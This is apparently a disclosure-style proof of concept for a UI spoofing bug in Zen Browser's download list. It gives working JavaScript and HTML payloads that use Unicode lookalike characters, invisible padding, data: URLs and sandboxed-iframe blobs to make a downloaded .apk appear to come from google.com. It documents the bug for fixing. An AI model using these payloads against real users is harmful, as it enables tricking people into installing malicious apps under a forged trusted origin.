# Zen Browser — download filename origin spoof

PoC for a UI misrepresentation bug in Zen Browser 1.24.2b.

The download list renders the page-controlled filename as the entry title. The title uses
`text-overflow: ellipsis`, which hides the tail of the string. Unicode lookalikes for `:`
and `/` survive Firefox's filename sanitization, so a page can make a downloaded `.apk`
appear to come from `google.com`.

## Payloads

Variant A — fake "From" line, whole string fits in the title:

```js
const name = "ini aplikasi apa From https\u2236\u2215\u2215google.com.apk";
```

Variant B — hidden extension, invisible padding pushes `.apk` past the ellipsis:

```js
const name = "https\u2236\u2215\u2215google.com" + "\u2800".repeat(40) + ".apk";
```

- `U+2236` RATIO — looks like `:`
- `U+2215` DIVISION SLASH — looks like `/`
- `U+2800` BRAILLE PATTERN BLANK — invisible filler

## Result

| Variant | Visible title | Hidden |
|---|---|---|
| A | `ini aplikasi apa From https∶∕∕google.com.apk` | nothing |
| B | `https∶∕∕google.com` + blanks | `.apk` |

Variant A only fits without padding: the title is 265px wide and holds about 45 characters.
Adding `U+2800` padding pushes the tail past the ellipsis.

Variant C — the subtitle normally shows the real host (`1 bytes — killukeren.github.io — 22:44`).
Downloading from a `data:` URL makes it show `(data)` instead, so the only origin-looking
text left is the page-controlled title:

```js
const a = document.createElement("a");
a.href = "data:text/html,<b>x</b>";
a.download = "ini aplikasi apa From https\u2236\u2215\u2215google.com.apk";
a.click();
```

Any `data:` payload works (`data:text/html`, `data:,x`, `data:application/octet-stream`).
A `data:` page cannot be opened by clicking a link — Firefox blocks top-level `data:`
navigation — so the attack page itself must be served over http(s); only the download
target is `data:`.

| Source | Subtitle |
|---|---|
| `https://…` | `1 bytes — killukeren.github.io — 22:44` |
| `blob:https://…` | `1 bytes — killukeren.github.io — 22:44` |
| `data:` | `1 bytes — (data) — 22:44` |
| `blob:null/…` (from a sandboxed iframe) | `1 bytes — (data) — 22:44` |

Variant D — same result with a blob, as long as the blob URL has a null origin:

```html
<iframe sandbox="allow-scripts allow-downloads" srcdoc="&lt;script&gt;
  const u = URL.createObjectURL(new Blob(['x'], {type:'application/octet-stream'}));
  const a = document.createElement('a');
  a.href = u; a.download = 'ini aplikasi apa From https\u2236\u2215\u2215google.com.apk';
  a.click();
&lt;/script&gt;"></iframe>
```

A forged blob URL (`blob:https://google.com/…`) does not resolve, so the download fails.

Firefox 160 is not affected by this variant: its download item uses `crop="center"`, so the
extension stays visible.

## Affected code

- `src/zen/library/ZenLibraryWidget.sys.mjs` — `#fileName()`, title assignment
- `src/zen/common/styles/zen-library-widget.css` — `text-overflow: ellipsis` on
  `.zen-library-download-list-title`

## Live demo

https://killukeren.github.io/donwload-vuln/
